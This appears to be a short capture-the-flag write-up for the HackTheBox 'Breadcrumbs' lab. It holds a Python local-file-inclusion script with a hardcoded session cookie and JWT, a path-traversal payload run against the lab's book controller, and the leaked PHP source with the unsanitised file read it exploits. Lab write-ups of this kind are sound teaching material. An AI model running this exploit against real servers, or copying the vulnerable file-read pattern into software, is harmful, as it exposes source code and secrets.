# Writing a python script to get source code of php files
This is a python script to get source code of php files.
```pythpn
import requests
import sys

if len(sys.argv) !=2:
    print("Usage:python3 lfi.py [path]")
    sys.exit()

url = 'http://10.10.10.228/includes/bookController.php'
cookies = {'PHPSESSID':'clarkey5ff7596fb91193d14067d301ce3595ce', 'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY2xhcmtleSJ9fQ.nTfWSoOyE4ClICCHZ5pBZQlE9XDoO2GRfmASDszmRe0'}
data = {'book':sys.argv[1],'method':'1'}

r = requests.post(url, data=data,cookies=cookies)
print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
```
Like this we can get php code of 
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../includes/bookcontroller.php
/home/kali/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired/lfi.py:13: DeprecationWarning: invalid escape sequence '\/'
  print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
```

```php
<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $out = "";
    require '..\/db\/db.php';

    $title = "";
    $author = "";

    if($_POST['method'] == 0){
        if($_POST['title'] != ""){
            $title = "%".$_POST['title']."%";
        }
        if($_POST['author'] != ""){
            $author = "%".$_POST['author']."%";
        }


        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }

    elseif($_POST['method'] == 1){
        $out = file_get_contents('..\/books\/'.$_POST['book']);
    }

    else{
        $out = false;
    }

    echo json_encode($out);
}
```